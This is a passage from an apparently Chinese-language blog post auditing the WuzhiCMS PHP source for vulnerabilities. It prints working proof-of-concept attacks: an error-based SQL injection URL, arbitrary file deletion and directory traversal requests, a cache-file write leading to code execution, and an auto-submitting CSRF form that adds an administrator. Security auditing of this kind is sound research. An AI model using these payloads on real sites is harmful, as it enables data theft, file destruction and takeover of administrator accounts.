+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function __construct($config_file = &#x27;mysql_config&#x27;) &#123;<br>    $this-&gt;mysql_config = get_config($config_file);<br>    $this-&gt;dbname = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;dbname&#x27;];<br>    $this-&gt;tablepre = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;tablepre&#x27;];<br>    $this-&gt;dbcharset = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;dbcharset&#x27;];<br><br>    $this-&gt;slave_server = isset($this-&gt;mysql_config[$this-&gt;db_key][&#x27;slave_server&#x27;]) ? $this-&gt;mysql_config[$this-&gt;db_key][&#x27;slave_server&#x27;] : &#x27;&#x27;;<br><br>    $class = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;type&#x27;];<br>    require_once(COREFRAME_ROOT.&#x27;app/core/libs/class/&#x27;.$class.&#x27;.class.php&#x27;);<br>    $classname = &#x27;WUZHI_&#x27;.$class;<br>    $this-&gt;master_db = new $classname($this-&gt;mysql_config[$this-&gt;db_key]);<br></code></pre></td></tr></table></figure>
+
+<p>所以就跟到了 mysqli.class.php 的 delet 方法</p>
+<p>好这里是直接拼接的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function delete($table, $where = &#x27;&#x27;) &#123;<br>	$where = $where ? &#x27; WHERE &#x27;.$where: &#x27;&#x27;;<br>	$sql = &#x27;DELETE FROM `&#x27;.$this-&gt;tablepre.$table.&#x27;`&#x27;.$where;<br>	return $this-&gt;query($sql);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在 query 中用了 halt，  所以报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function query($sql, $type = &#x27;&#x27;, $cachetime = FALSE) &#123;<br>       //if($_SERVER[&#x27;REMOTE_ADDR&#x27;]==&#x27;127.0.0.1&#x27;) echo $sql.&quot;&lt;br&gt;&quot;;<br>    if(!($query = mysqli_query($this-&gt;link,$sql)) &amp;&amp; $type != &#x27;SILENT&#x27;) &#123;<br>       $this-&gt;halt(&#x27;MySQL Query Error&#x27;, $sql);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>以上就是分析的全过程，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/www/index.php?m=member&amp;f=group&amp;v=del&amp;groupid=4+and+(updatexml(1,concat(0x7e,database()),1))--+&amp;_su=wuzhicms....<br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752980981068-0a8d21aa-e036-4728-bb97-291f48df5bcb.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;">
+
+<h4 id="3-1-4-总结一下"><a href="#3-1-4-总结一下" class="headerlink" title="3.1.4 总结一下"></a>3.1.4 总结一下</h4><ol>
+<li><p>这套源码将接受的全局参数赋值给$where 时用’或”闭合时没做数组处理就直接传：使得安全处理方法仅仅对仅过滤%20 %27——&gt;使得能成功闭合</p>
+<p>注入 3 虽然是将$where 处理为数组再传入安全处理的方法，但它是数字型的不需要闭合</p>
+</li>
+<li><p>而且·在执行 sql 语句时用自定义的 query 方法，该方法里面调用了 halt 方法输出报错信息——&gt;使得能用报错注入</p>
+</li>
+</ol>
+<hr>
+<h3 id="3-2-任意文件删除"><a href="#3-2-任意文件删除" class="headerlink" title="3.2 任意文件删除"></a>3.2 任意文件删除</h3><p>危险函数列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">unlink()<br>rmdir()<br>array_map(&#x27;unlink&#x27;,glob())<br>system(&quot;rm -rf $path&quot;)<br>Filesystem::deleteDirectory<br>remove_dir<br>Filesystem::delete<br></code></pre></td></tr></table></figure>
+
+<p>全局搜索 unlink()，查看参数可控的</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753075398703-bd22ff2a-b1b9-49bd-892b-bdc04c7010c4.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p>找到 coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php del()方法</p>
+<p>调用自定义的 my_unlink 方法，url 参数经过 remove_xss 处理，没过滤..&#x2F;</p>
+<p>我们要执行危险方法 unlink,if 里面有，else 里面也有，执行哪一个？</p>
+<p>注意这里 if 里面的 unlink 是以从数据库中查询后返回的结果作为参数，参数不可控的！</p>
+<p>所以就进入下面的 else，</p>
+<p>$url中的ATTACHMENT_URL     替换为空赋给$path</p>
+<p>define(‘ATTACHMENT_URL’,’<a target="_blank" rel="noopener" href="http://wuzhicms:8126/www/uploadfile/">http://wuzhicms:8126/www/uploadfile/</a>‘);</p>
+<p><font style="color:rgb(36, 41, 47);">到数据库中去查找有没有对应的信息，当 id 不传入，这里$att_info 为空， 直接调用类中的 my_unlink 方法</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function del()<br>   &#123;<br>       $id = isset($GLOBALS[&#x27;id&#x27;]) ? $GLOBALS[&#x27;id&#x27;] : &#x27;&#x27;;<br>       $url = isset($GLOBALS[&#x27;url&#x27;]) ? remove_xss($GLOBALS[&#x27;url&#x27;]) : &#x27;&#x27;;<br>       if (!$id &amp;&amp; !$url) MSG(L(&#x27;operation_failure&#x27;), HTTP_REFERER, 3000);<br><br><br><br>       //if<br>       if ($id) &#123;<br>       	if(!is_array($id)) &#123;<br>			 $ids = array($id);<br>		    &#125; else &#123;<br>		  	$ids = $id;<br>		    &#125;<br><br>		  foreach($ids as $id) &#123;<br>			$where = array(&#x27;id&#x27; =&gt; $id);<br>			$att_info = $this-&gt;db-&gt;get_one(&#x27;attachment&#x27;, $where, &#x27;usertimes,path&#x27;);<br>			if ($att_info[&#x27;usertimes&#x27;] &gt; 1) &#123;<br>				$this-&gt;db-&gt;update(&#x27;attachment&#x27;, &#x27;usertimes = usertimes-1&#x27;, $where);<br>			&#125;<br>			else &#123;<br>				$this-&gt;my_unlink(ATTACHMENT_ROOT . $att_info[&#x27;path&#x27;]);<br>				$this-&gt;db-&gt;delete(&#x27;attachment&#x27;, $where);<br>				$this-&gt;db-&gt;delete(&#x27;attachment_tag_index&#x27;, array(&#x27;att_id&#x27;=&gt;$id));<br>			 &#125;<br>		   &#125;<br>		  MSG(L(&#x27;delete success&#x27;), HTTP_REFERER, 1000);<br>       &#125;<br><br><br>       //else在这里<br>       else &#123;<br>           if (!$url) MSG(&#x27;url del &#x27; . L(&#x27;operation_failure&#x27;), HTTP_REFERER, 3000);<br>           $path = str_ireplace(ATTACHMENT_URL, &#x27;&#x27;, $url);<br>           if ($path) &#123;<br>               $where = array(&#x27;path&#x27; =&gt; $path);<br>               $att_info = $this-&gt;db-&gt;get_one(&#x27;attachment&#x27;, $where, &#x27;usertimes,id&#x27;);<br><br>               if (empty($att_info)) &#123;<br>                   $this-&gt;my_unlink(ATTACHMENT_ROOT . $path);<br>                   MSG(L(&#x27;operation_success&#x27;), HTTP_REFERER, 3000);<br>               &#125;<br><br>               if ($att_info[&#x27;usertimes&#x27;] &gt; 1) &#123;<br>                   $this-&gt;db-&gt;update(&#x27;attachment&#x27;, &#x27;usertimes = usertimes-1&#x27;, array(&#x27;id&#x27; =&gt; $att_info[&#x27;id&#x27;]));<br>               &#125;<br>               else &#123;<br>                   $this-&gt;my_unlink(ATTACHMENT_ROOT . $path);<br>                   $this-&gt;db-&gt;delete(&#x27;attachment&#x27;, array(&#x27;id&#x27; =&gt; $att_info[&#x27;id&#x27;]));<br>                   MSG(L(&#x27;operation_success&#x27;), HTTP_REFERER, 3000);<br>               &#125;<br>           &#125;.....<br><br></code></pre></td></tr></table></figure>
+
+<p>单独拿出来：</p>
+<p>$this-&gt;my_unlink(ATTACHMENT_ROOT . $path);</p>
+<blockquote>
+<p><font style="color:rgb(36, 41, 47);">当前目录：define(‘ATTACHMENT_ROOT’,WWW_ROOT.’uploadfile&#x2F;‘);</font></p>
+</blockquote>
+<p>my_link()</p>
+<p><font style="color:rgb(36, 41, 47);">看到该方法，只要传入的路径下存在指定的文件，就直接进行操作，那么就能达到任意文件删除的目的</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">private function my_unlink($path)<br>    &#123;<br>        if(file_exists($path)) unlink($path);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>在网站根目录下放 1.php</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080218359-70c593f1-4cb7-4f06-9349-fe5e30640505.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-2-目录遍历"><a href="#3-2-目录遍历" class="headerlink" title="3.2 目录遍历"></a>3.2 目录遍历</h3><p>在返回上一级目录这里，抓包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/www/index.php?dir=.&amp;m=attachment&amp;f=index&amp;v=dir&amp;_su=wuzhicms&amp;_menuid=29&amp;_submenuid=52<br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753016780482-d1b05019-7136-40bf-8db5-a0956b9b8611.png" srcset="/img/loading.gif" lazyload style="zoom:33%;">
+
+<p>分析路由，对应文件就在 coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p>
+<p>$GLOBALS[‘dir’]去除首尾空格后，过滤” ..\ .&#x2F; .&#x2F; .\ %2F &#x2F;&#x2F;“</p>
+<p>将变量$dir 拼接到 ATTACHMENT_ROOT . $dir . ‘&#x2F;‘ . ‘*‘中传入 glob() define(‘ATTACHMENT_ROOT’,WWW_ROOT.’uploadfile&#x2F;‘);</p>
+<blockquote>
+<p><font style="color:rgba(0, 0, 0, 0.85);">在 PHP 中，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;glob()&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 是一个用于文件系统操作的内置函数，用于查找与指定模式匹配的文件路径。它类似于命令行中的 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;ls&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;dir&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 命令，但返回的是符合条件的文件和目录的数组</font></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function dir()<br>&#123;<br>    $dir = isset($GLOBALS[&#x27;dir&#x27;]) &amp;&amp; trim($GLOBALS[&#x27;dir&#x27;]) ? str_replace(array(&#x27;..\\&#x27;, &#x27;../&#x27;, &#x27;./&#x27;, &#x27;.\\&#x27;), &#x27;&#x27;, trim($GLOBALS[&#x27;dir&#x27;])) : &#x27;&#x27;;<br>    $dir = str_ireplace(array(&#x27;%2F&#x27;, &#x27;//&#x27;), &#x27;/&#x27;, $dir);<br>    $lists = glob(ATTACHMENT_ROOT . $dir . &#x27;/&#x27; . &#x27;*&#x27;);<br>    if (!empty($lists)) rsort($lists);<br>    $cur_dir = str_replace(array(WWW_ROOT, DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR), array(&#x27;&#x27;, DIRECTORY_SEPARATOR), ATTACHMENT_ROOT . $dir . &#x27;/&#x27;);<br>    include $this-&gt;template(&#x27;dir&#x27;, M);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以 poc 中 dir&#x3D;.. （<code>.</code>不会过滤,与后面的&#x2F;进行拼接 就返回上一级，可以目录遍历）</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753079272438-47519d69-9186-4cc3-ad8c-9d138d0519e5.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<hr>
+<p><font style="color:rgb(77, 77, 77);">&#x2F;coreframe&#x2F;app&#x2F;template&#x2F;admin&#x2F;index.php 这个文件中还有一个方法 listing 也有同样的问题。不详细看了</font></p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080513979-9287fe50-69bc-4ddb-a491-888067f12ec2.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function listing() &#123;<br>    $dir = $this-&gt;dir;<br>    $lists = glob(TPL_ROOT.$dir.&#x27;/&#x27;.&#x27;*&#x27;);<br><br>    //if(!empty($lists)) rsort($lists);<br>    $cur_dir = str_replace(array( COREFRAME_ROOT ,DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR), array(&#x27;&#x27;,DIRECTORY_SEPARATOR), TPL_ROOT.$dir.&#x27;/&#x27;);<br>    $show_dialog = 1;<br>    include $this-&gt;template(&#x27;listing&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753080738235-86c2929d-ad7e-4d0a-8e8e-558ef20f628a.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-3-任意文件写入-文件包含-rce"><a href="#3-3-任意文件写入-文件包含-rce" class="headerlink" title="3.3 任意文件写入+文件包含&#x3D;rce"></a>3.3 <strong>任意文件写入+文件包含&#x3D;rce</strong></h3><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php 文件</p>
+<p><font style="color:rgb(36, 41, 47);">对传入的 submit 参数进行判断，有则用 cache_in_db 进行缓存信息的写入，没有会读取缓存信息</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function ueditor()<br> &#123;<br>     if (isset($GLOBALS[&#x27;submit&#x27;])) &#123;<br>         $cache_in_db = cache_in_db($GLOBALS[&#x27;setting&#x27;], V, M);<br>         set_cache(V, $GLOBALS[&#x27;setting&#x27;]);<br>         MSG(L(&#x27;operation_success&#x27;), HTTP_REFERER, 3000);<br>     &#125;<br>     else &#123;<br>         $setting = get_cache(V);<br>if(empty($setting)) $setting = cache_in_db(&#x27;&#x27;, V, M);<br>         include $this-&gt;template(V, M);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>将信息写入后，调用 set_cache()(coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php 文件里)</p>
+<p>$filename传入的是V， $data是$GLOBALS[‘setting’]，<strong>在下面的方法中 file_put_contents($filename, $data);将$data 未处理写入$filename 中</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">function set_cache($filename, $data, $dir = &#x27;_cache_&#x27;)&#123;<br>	static $_dirs;<br>	if ($dir == &#x27;&#x27;) return FALSE;<br>	if (!preg_match(&#x27;/([a-z0-9_]+)/i&#x27;, $filename)) return FALSE;<br>	$cache_path = CACHE_ROOT . $dir . &#x27;/&#x27;;<br>	if (!isset($_dirs[$filename . $dir])) &#123;<br>		if (!is_dir($cache_path)) &#123;<br>			mkdir($cache_path, 0777, true);<br>		&#125;<br>		$_dirs[$filename . $dir] = 1;<br>	&#125;<br><br>	$filename = $cache_path . $filename . &#x27;.&#x27; . CACHE_EXT . &#x27;.php&#x27;;<br>	if (is_array($data)) &#123;<br>		$data = &#x27;&lt;?php&#x27; . &quot;\r\n return &quot; . array2string($data) . &#x27;?&gt;&#x27;;<br>	&#125;<br>	file_put_contents($filename, $data);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功写入缓存文件里面</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087267459-6425ad50-2efc-44ad-8022-824432562dc9.png" srcset="/img/loading.gif" lazyload></p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087745037-714609b5-c856-492b-830d-33d0396d44e5.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;">
+
+<p>未传入 submit 时<font style="color:rgb(36, 41, 47);">调用</font>的 get_cache<font style="color:rgb(36, 41, 47);">方法</font></p>
+<p><font style="color:rgb(36, 41, 47);">$filename(V) 和$dir( <em>cache</em>)作为参数</font></p>
+<p><font style="color:rgb(36, 41, 47);">get_cache_path 获取缓存文件对应的路径并赋值给$file</font></p>
+<p><strong><font style="color:rgb(36, 41, 47);">最后包含$file</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">function get_cache($filename, $dir = &#x27;_cache_&#x27;)&#123;<br>    $file = get_cache_path($filename, $dir);<br>    if (!file_exists($file)) return &#x27;&#x27;;<br>    $data = include $file;<br>    return $data;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以要触发上面写的 php 代码</p>
+<p>直接访问&#x2F;www&#x2F;index.php?m&#x3D;attachment&amp;f&#x3D;index&amp;_su&#x3D;wuzhicms&amp;v&#x3D;ueditor</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753087692662-4fd6d938-0863-476b-a828-51c6989a2d5f.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h3 id="3-4-CSRF"><a href="#3-4-CSRF" class="headerlink" title="3.4 CSRF"></a>3.4 CSRF</h3><p>添加管理员抓包，根据对应的路由找到方法</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753093920418-e5b406f0-2752-484a-a3c2-ce034144a133.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753093952917-a61182f0-a59c-439f-96b0-263d90953ad5.png" srcset="/img/loading.gif" lazyload></p>
+<p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;power.php add 方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function add() &#123;<br>		if(isset($GLOBALS[&#x27;submit&#x27;])) &#123;<br>            if(empty($GLOBALS[&#x27;form&#x27;][&#x27;username&#x27;])) MSG(L(&#x27;parameter error&#x27;));<br>            $username = $GLOBALS[&#x27;form&#x27;][&#x27;username&#x27;];<br>            $r = $this-&gt;db-&gt;get_one(&#x27;member&#x27;,array(&#x27;username&#x27;=&gt;$username));<br>            if(!$r[&#x27;uid&#x27;]) MSG(L(&#x27;账号不存在，请先管理会员处－添加账号&#x27;));<br>            $rs = $this-&gt;db-&gt;get_one(&#x27;admin&#x27;,array(&#x27;uid&#x27;=&gt;$r[&#x27;uid&#x27;]));<br>            if($rs) MSG(L(&#x27;管理员已存在！&#x27;));<br>			$formdata = array();<br>			$formdata[&#x27;uid&#x27;] = $r[&#x27;uid&#x27;];<br>            if(empty($GLOBALS[&#x27;form&#x27;][&#x27;password&#x27;])) &#123;<br>                $formdata[&#x27;password&#x27;] = &#x27;&#x27;;<br>            &#125; else &#123;<br>                $factor = substr(random_string(&#x27;md5&#x27;),0,6);<br>                $password = md5(md5($GLOBALS[&#x27;form&#x27;][&#x27;password&#x27;]).$factor);<br>                $formdata[&#x27;password&#x27;] = $password;<br>                $formdata[&#x27;factor&#x27;] = $factor;<br>            &#125;<br>            $formdata[&#x27;role&#x27;] = &#x27;,&#x27;.implode(&#x27;,&#x27;,$GLOBALS[&#x27;form&#x27;][&#x27;role&#x27;]).&#x27;,&#x27;;<br>            $formdata[&#x27;truename&#x27;] = remove_xss($GLOBALS[&#x27;form&#x27;][&#x27;truename&#x27;]);<br>			$this-&gt;db-&gt;insert(&#x27;admin&#x27;,$formdata);<br>			MSG(L(&#x27;operation success&#x27;));<br>		&#125; else &#123;<br>            $show_formjs = 1;<br>			$form = load_class(&#x27;form&#x27;);<br>            $roles = $this-&gt;db-&gt;get_list(&#x27;admin_role&#x27;, &#x27;&#x27;, &#x27;*&#x27;, 0, 100);<br><br>			include $this-&gt;template(&#x27;power_add&#x27;);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(44, 50, 60);">只对提交的参数进行判断检查是否有用户名，两次 get_one()从数据库查询该用户是否在会员表中存在，是否已经是管理员， $this-&gt;db-&gt;insert(‘admin’,$formdata);直接插入数据库并未对身份</font><font style="color:rgb(76, 73, 72);background-color:rgba(255, 255, 255, 0.75);">没有进行 token 校验或者其他手段，这就导致我们可以伪造数据包进行 csrf</font></p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753097118332-d057601f-adc0-404d-92a8-33b35338d5fa.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;html&gt;<br>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br>  &lt;body&gt;<br>    &lt;form action=&quot;http://wuzhicms:8126/www/index.php?m=core&amp;f=power&amp;v=add&amp;&amp;_su=wuzhicms&amp;_menuid=61&amp;_submenuid=62&quot; method=&quot;POST&quot;&gt;<br>      &lt;input type=&quot;hidden&quot; name=&quot;form[role][]&quot; value=&quot;1&quot; /&gt;<br>      &lt;input type=&quot;hidden&quot; name=&quot;form[username]&quot; value=&quot;test&quot; /&gt;<br>      &lt;input type=&quot;hidden&quot; name=&quot;form[password]&quot; value=&quot;test&quot; /&gt;<br>      &lt;input type=&quot;hidden&quot; name=&quot;form[truename]&quot; value=&quot;qwe&quot; /&gt;<br>      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;<br>      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;<br>    &lt;/form&gt;<br>    &lt;script&gt;<br>      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);<br>      document.forms[0].submit();<br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753095213085-4dcf243f-ce5e-458b-947f-76b12a354b8b.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p>成功添加</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753097168912-bce1022e-d090-4c06-b943-12633dbf4693.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">php代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#php代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>wuzhicms</div>
+      <div>https://bxhhf.github.io/2025/08/27/yuque-hexo-post/wuzhicms/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bxhhf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/27/yuque-hexo-post/RMI%E5%9F%BA%E7%A1%80/" title="RMI基础">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RMI基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/27/yuque-hexo-post/java_sec_code/" title="java_sec_code">
+                        <span class="hidden-mobile">java_sec_code</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","appKey":"gbgqDB024hr2I7jmwbO6Mz2a","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
